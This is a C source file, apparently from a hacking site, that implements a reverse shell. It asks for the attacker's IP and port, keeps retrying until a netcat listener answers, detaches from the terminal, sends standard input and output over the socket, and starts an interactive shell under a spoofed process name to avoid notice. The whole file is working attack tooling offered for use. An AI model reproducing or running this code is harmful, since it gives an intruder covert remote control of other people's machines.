/*
By: TFC
For: Basehack.net

use nc to listen out for a connection 
*/

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
    
char server[] = "localhost",line[212],spoof[] = "system",shell[] = "/bin/sh";
int port;


void deets()
{

printf("port: "); //port you want to connect to with nc 
scanf("%d", &port);

printf("shell: "); //prefered shell e.g /bin/bash
scanf("%s", shell);

printf("spoof ID: ");//will show up instead of "%s" shell  e.g /bin/sh
scanf("%s", spoof);

printf("your IP: ");//needs to probe for this
scanf("%s", server); 

}
 int main(int arg, char *argv[])
 {

int mainsock;
char title[5000] = "";
int x;
deets();   

again: //start look for to see if host is listening 
        

mainsock = socket (AF_INET, SOCK_STREAM, 0);
struct sockaddr_in sin;
struct hostent *host = gethostbyname (server);
memcpy (&sin.sin_addr.s_addr, host->h_addr, host->h_length);
sin.sin_family = AF_INET;
sin.sin_port = htons (port);
if(connect (mainsock, (struct sockaddr *) &sin, sizeof (sin)) < 0) 
{
       sleep(1);
       goto again; //if host not found, repeat.
}
setsid();
umask(0);
dup2(mainsock, 0);
dup2(mainsock, 1);
dup2(mainsock, 2);
    
sprintf(title, "Logged in as %s (%s)", getenv("USER"), getenv("HOME"));
chdir(getenv("HOME"));
fprintf(stderr, "%s \n", title);
printf("By: basehack.net [/TFC]\n");

execl( shell, spoof,"-i" ,0);
 close(mainsock);
return 0;
}
